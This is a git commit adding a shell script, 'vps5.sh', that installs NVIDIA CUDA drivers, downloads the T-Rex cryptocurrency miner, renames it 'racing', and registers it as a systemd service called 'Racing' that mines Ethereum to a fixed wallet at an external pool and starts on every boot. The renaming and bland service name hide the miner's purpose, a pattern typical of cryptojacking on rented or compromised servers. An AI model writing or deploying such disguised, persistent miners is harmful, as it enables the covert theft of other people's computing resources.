9529bb71a8c38a4e5de1985b41cdf3c8ec86ca32
dinhtrungac1 <91616570+dinhtrungac1@users.noreply.github.com>
2022-04-23 19:21:08 +0700

    Create vps5.sh

---
+++ vps5.sh
@@ -0,0 +1,25 @@
+cd /home
+myworker=$(date +'%d%m_%H%M%S_')
+username=$HOSTNAME
+myworker+=$username
+sudo apt-get install linux-headers-$(uname -r) -y
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+sudo apt-get update
+sudo apt-get -y install cuda-drivers
+sudo apt-get install libcurl3 -y
+sudo apt-get install cuda-drivers-510
+sudo apt-get install cuda-drivers-fabricmanager-510 -y
+sudo systemctl enable nvidia-fabricmanager
+sudo systemctl start nvidia-fabricmanager
+sleep 2m
+wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz  
+tar -zxvf t-rex-0.22.1-linux.tar.gz
+mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 0x3cf2e52746bf8a1e8f9248b24bfc8b49b09c79b8 -p x -w ${myworker}_reeeeee\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo systemctl daemon-reload
+sudo systemctl enable racing.service
+./racing -a ethash -o us-eth.2miners.com:2020 -u 0x3cf2e52746bf8a1e8f9248b24bfc8b49b09c79b8 -p x -w $myworker &
